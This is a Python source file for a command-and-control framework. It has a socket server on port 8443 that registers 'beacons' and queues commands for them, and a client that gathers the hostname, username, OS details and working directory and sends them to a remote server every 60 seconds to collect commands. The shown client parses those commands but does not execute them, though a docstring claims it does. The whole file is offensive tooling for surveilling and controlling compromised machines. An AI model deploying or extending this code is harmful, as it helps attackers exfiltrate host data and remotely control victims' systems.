"""
Advanced Command and Control Module - Simplified implementation.
"""

import base64
import json
import os
import random
import socket
import threading
import time
from datetime import datetime
from typing import Dict, List, Any, Optional


class AdvancedC2Server:
    """Advanced C2 Server with basic functionality."""
    
    def __init__(self, host: str = "0.0.0.0", port: int = 8443):
        self.host = host
        self.port = port
        self.beacons = []
        self.commands = {}
        self.running = False
        self.server_socket = None
        
        print(f"[+] Advanced C2 Server initialized on {host}:{port}")
    
    def start(self) -> Dict[str, Any]:
        """Start the C2 server."""
        try:
            self.running = True
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            
            print(f"[+] C2 Server listening on {self.host}:{self.port}")
            
            # Start accepting connections in a separate thread
            server_thread = threading.Thread(target=self._accept_connections)
            server_thread.daemon = True
            server_thread.start()
            
            return {
                "status": "success",
                "message": f"C2 Server started on {self.host}:{self.port}",
            }
            
        except Exception as e:
            return {"status": "error", "message": str(e)}
    
    def _accept_connections(self):
        """Accept incoming connections from beacons."""
        while self.running:
            try:
                client_socket, address = self.server_socket.accept()
                print(f"[+] New connection from {address}")
                
                # Handle client in separate thread
                client_thread = threading.Thread(
                    target=self._handle_client,
                    args=(client_socket, address)
                )
                client_thread.daemon = True
                client_thread.start()
            except Exception as e:
                if self.running:
                    print(f"[-] Error accepting connection: {e}")
    
    def _handle_client(self, client_socket: socket.socket, address: tuple):
        """Handle communication with a single beacon."""
        try:
            # Receive beacon data
            data = client_socket.recv(4096)
            if not data:
                return
            
            # Parse beacon data
            beacon_data = json.loads(data.decode())
            beacon_id = beacon_data.get("beacon_id", f"UNKNOWN-{address[0]}")
            
            # Register beacon
            beacon_info = {
                "beacon_id": beacon_id,
                "address": address,
                "last_seen": datetime.now().isoformat(),
                "system_info": beacon_data.get("system_info", {}),
                "status": "active"
            }
            
            # Update or add beacon
            existing_beacon = next((b for b in self.beacons if b["beacon_id"] == beacon_id), None)
            if existing_beacon:
                existing_beacon.update(beacon_info)
            else:
                self.beacons.append(beacon_info)
                print(f"[+] New beacon registered: {beacon_id}")
            
            # Check for commands for this beacon
            command = self.commands.get(beacon_id, {"command": "noop", "data": {}})
            
            # Send command response
            response = json.dumps(command).encode()
            client_socket.send(response)
            
            # Clear command after sending
            if command["command"] != "noop":
                del self.commands[beacon_id]
            
        except Exception as e:
            print(f"[-] Error handling client {address}: {e}")
        finally:
            client_socket.close()
    
    def send_command(self, beacon_id: str, command: str, data: Dict[str, Any] = None) -> Dict[str, Any]:
        """Send a command to a specific beacon."""
        if not data:
            data = {}
        
        self.commands[beacon_id] = {
            "command": command,
            "data": data,
            "timestamp": datetime.now().isoformat()
        }
        
        print(f"[+] Command '{command}' queued for beacon {beacon_id}")
        return {"status": "success", "message": f"Command queued for {beacon_id}"}
    
    def get_beacons(self) -> List[Dict[str, Any]]:
        """Get list of active beacons."""
        # Clean up old beacons (older than 5 minutes)
        current_time = datetime.now()
        self.beacons = [
            beacon for beacon in self.beacons
            if (current_time - datetime.fromisoformat(beacon["last_seen"])).total_seconds() < 300
        ]
        
        return self.beacons
    
    def stop(self) -> Dict[str, Any]:
        """Stop the C2 server."""
        self.running = False
        if self.server_socket:
            self.server_socket.close()
        
        print("[+] C2 Server stopped")
        return {"status": "success", "message": "C2 Server stopped"}


class AdvancedC2Client:
    """Advanced C2 Client with beaconing and command execution."""
    
    def __init__(self, server_host: str, server_port: int, beacon_id: str = None):
        self.server_host = server_host
        self.server_port = server_port
        self.beacon_id = beacon_id or self._generate_beacon_id()
        self.running = False
        
        print(f"[+] Advanced C2 Client initialized with ID: {self.beacon_id}")
    
    def _generate_beacon_id(self) -> str:
        """Generate a unique beacon ID."""
        hostname = socket.gethostname()
        timestamp = str(int(time.time()))
        random_suffix = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=6))
        return f"{hostname}-{timestamp}-{random_suffix}"
    
    def _collect_system_info(self) -> Dict[str, Any]:
        """Collect system information for beaconing."""
        try:
            import platform
            import getpass
            
            system_info = {
                "hostname": socket.gethostname(),
                "username": getpass.getuser(),
                "platform": platform.system(),
                "platform_release": platform.release(),
                "platform_version": platform.version(),
                "architecture": platform.machine(),
                "processor": platform.processor(),
                "working_directory": os.getcwd(),
                "python_version": platform.python_version()
            }
            
            return system_info
        except Exception as e:
            return {"error": str(e)}
    
    def send_beacon(self) -> Dict[str, Any]:
        """Send a beacon to the C2 server and receive commands."""
        try:
            # Prepare beacon data
            beacon_data = {
                "beacon_id": self.beacon_id,
                "timestamp": datetime.now().isoformat(),
                "system_info": self._collect_system_info()
            }
            
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(30)
                sock.connect((self.server_host, self.server_port))
                sock.send(json.dumps(beacon_data).encode())
                
                # Receive command
                response = sock.recv(4096)
                
            # Parse command
            command_data = json.loads(response.decode())
            
            return {
                "status": "success",
                "beacon_id": self.beacon_id,
                "command_received": command_data.get("command"),
                "next_beacon": "60 seconds"
            }
            
        except Exception as e:
            return {"status": "error", "message": str(e)}
    
    def start_beaconing(self, interval: int = 60) -> Dict[str, Any]:
        """Start continuous beaconing."""
        self.running = True
        
        def beacon_loop():
            while self.running:
                try:
                    result = self.send_beacon()
                    if result["status"] == "success":
                        print(f"[+] Beacon sent successfully, next in {interval}s")
                    else:
                        print(f"[-] Beacon failed: {result['message']}")
                except Exception as e:
                    print(f"[-] Beacon error: {e}")
                
                time.sleep(interval)
        
        beacon_thread = threading.Thread(target=beacon_loop)
        beacon_thread.daemon = True
        beacon_thread.start()
        
        return {"status": "success", "message": f"Beaconing started with {interval}s interval"}
    
    def stop_beaconing(self) -> Dict[str, Any]:
        """Stop continuous beaconing."""
        self.running = False
        return {"status": "success", "message": "Beaconing stopped"}